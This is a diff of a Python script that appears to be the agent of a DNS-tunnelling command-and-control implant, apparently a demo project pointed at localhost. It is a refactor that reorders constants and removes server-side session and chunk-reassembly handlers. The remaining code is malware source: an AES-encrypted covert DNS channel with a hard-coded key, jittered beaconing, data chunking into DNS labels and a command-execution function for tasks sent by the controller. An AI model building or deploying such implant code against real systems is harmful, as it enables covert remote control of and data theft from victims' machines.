@@ -1,47 +1,40 @@
 import json
+import time
 import base64
 import random
 import socket
-from Crypto.Cipher import AES
-from Crypto.Random import get_random_bytes
-from Crypto.Util.Padding import pad, unpad
-import time
-from dnslib import DNSRecord, QTYPE
 import subprocess
 
+from Crypto.Cipher import AES
+from dnslib import DNSRecord, QTYPE
+from Crypto.Random import get_random_bytes
+from Crypto.Util.Padding import pad, unpad
 
-# Real scenarios: Agent ID can be created in C2 server side
-# Constant just for a demo
 AGENT_ID = "agent-uuid-0000"
 
-# request actions to avoind magic strings
-CALLBACK_ACTION = 'callback'
 SEND_ACTION = 'send'
-
-
-AES_KEY = b"0123456789abcdef"
-IV_SIZE=16
-
-CHUNK_LABEL_SIZE=48
-EDNS0 = 4096
-RR_TYPE="AAAA"
-
-DOMAIN="domain.local"
-
-SERVER="127.0.0.1"
-PORT=5353
-
-BASE_INTERVAL=3
-JITTER=1
+CALLBACK_ACTION = 'callback'
 
 NO_TASK_RESPONSE = "[NOTHING]"
 
-SESSIONS = {}
+IV_SIZE = 16
+AES_KEY = b"0123456789abcdef"
+
+EDNS0 = 4096
+RR_TYPE = "AAAA"
+CHUNK_LABEL_SIZE = 48
+
+
+PORT = 5353
+SERVER = "127.0.0.1"
+DOMAIN = "domain.local"
+
+JITTER = 1
+BASE_INTERVAL = 3
 
 def generate_random_interval(interval, jitter):
     lower_limit = interval - jitter
     upper_limit = interval + jitter
-    
     new_interval = random.randint(lower_limit, upper_limit)
     
     return new_interval
@@ -52,17 +45,6 @@ def b64_encode(data_bytes: bytes):
 def b64_decode(s: str) -> bytes:
     padding = '=' * (-len(s) % 4)
     return base64.urlsafe_b64decode(s + padding)
-
-def encrypt_data(key:bytes, data:bytes):
-    encoded_json = json.dumps(data, separators=(",",":"), ensure_ascii=False).encode()
-    iv = get_random_bytes(IV_SIZE)
-    cipher = AES.new(key, AES.MODE_CBC, iv)
-    ciphered = cipher.encrypt(pad(data, AES.block_size))
-
-    iv_padded = iv+ciphered
-    formated_data = b64_encode(iv_padded)
-
-    return formated_data
 
 def encrypt_aes_cbc(key: bytes, plaintext: bytes) -> bytes:
     iv = get_random_bytes(16)
@@ -134,78 +116,10 @@ def chunk_data(data, total_size):
 
     return chunks
 
-
-def mock_response(type, action, data=''):
-    if data != '':
-        fqdn = data.split(".")[0]
-        decoded_data = b64_decode(fqdn)
-        plain_fqdn = decrypt_aes_cbc(AES_KEY, decoded_data).decode('utf-8')
-
-    response = ''
-    if action == CALLBACK_ACTION:
-        print(f"[AGENT-CALLBACK] {plain_fqdn}")
-        response = encrypt_string(AES_KEY, "pwd")
-
-    return response
-
 def time_based_wait():
     interval = generate_random_interval(BASE_INTERVAL, JITTER)
     print(f'await for {interval} seconds', "\n [......]\n")
     time.sleep(interval)
-    return True
-
-def is_json(data: str) -> bool:
-    try:
-        json.loads(data)
-        return True
-    except json.JSONDecodeError:
-        return False
-
-def take_callback(agent_id):
-    print(f"[INCOMING CALLBACK]: {agent_id}")
-
-    if agent_id not in SESSIONS:
-        init_data = {
-            "messages": {}
-        }
-
-        SESSIONS[agent_id] = init_data
-    return True
-
-def take_chunk(chunk_data):
-    envelope = json.loads(chunk_data)
-
-    agent_id = envelope['agent_id']
-    message_id = envelope['message_id']
-    chunk_data = envelope['data']
-    chunk_index = envelope['chunk_index']
-
-    chunk_size = len(envelope['data'])
-
-    if message_id not in SESSIONS[agent_id]["messages"]:
-        init_data = {
-            "size": envelope['size'],
-            "loaded_data": 0,
-            "data": {}
-        }
-
-        SESSIONS[agent_id]["messages"][message_id] = init_data
-
-    SESSIONS[agent_id]["messages"][message_id]["data"][chunk_index] = chunk_data
-
-    current_size = SESSIONS[agent_id]["messages"][message_id]["loaded_data"]
-    SESSIONS[agent_id]["messages"][message_id]["loaded_data"] = current_size + chunk_size
-
-    expected_size =  SESSIONS[agent_id]["messages"][message_id]["size"]
-    if SESSIONS[agent_id]["messages"][message_id]["loaded_data"] == expected_size:
-        print("SESSIONS: ", SESSIONS)
-        chunks_data = SESSIONS[agent_id]["messages"][message_id]["data"]
-        sorted_indexes = sorted(SESSIONS[agent_id]["messages"][message_id]["data"].keys())
-        assembled_b64 = ''.join(chunks_data[i] for i in sorted_indexes)
-        decoded_data = b64_decode(assembled_b64).decode()
-        print(decoded_data)
-
-
     return True
 
 def execute_command(command_string: str) -> str:
@@ -231,55 +145,12 @@ def execute_command(command_string: str) -> str:
         print(f"Error: Command not found or invalid path: {command_name}")
         return f"error executing {command_string}"
 
-def handle(request):
-    head = request.split(".")[0]
-    try:
-        decoded_head = b64_decode(head)
-        decrypted_data = decrypt_aes_cbc(AES_KEY, decoded_head).decode()
-        is_callback = not is_json(decrypted_data)
-
-        if is_callback:
-            take_callback(decrypted_data)
-        else: 
-            take_chunk(decrypted_data)
-
-    except Exception as e:
-        print(f"[!] Error decoding fqdn head: ", e)
-
-    return True
 
 def send_bulk(requests):
     for request in requests:
         response = send_request(request)
 
-    
-
     return True
-
-def check_for_task(callback_response):
-    task = ''
-    have_task = False
-
-    decoded_response = b64_decode(callback_response)
-    plain_response = decrypt_aes_cbc(AES_KEY, decoded_response).decode('utf-8')
-
-    if plain_response != NO_TASK_RESPONSE:
-        task = plain_response
-        have_task = True
-
-    return have_task, plain_response
-
-def check_lens(requests):
-    limit_len = 255
-    flag = True
-
-    for request in requests:
-        if len(request) > limit_len:
-            print(f"invalid request {request}")
-            flag = False
-
-
-    return flag
 
 def build_callback(agent_id):
     encrypted = encrypt_string(AES_KEY, agent_id)
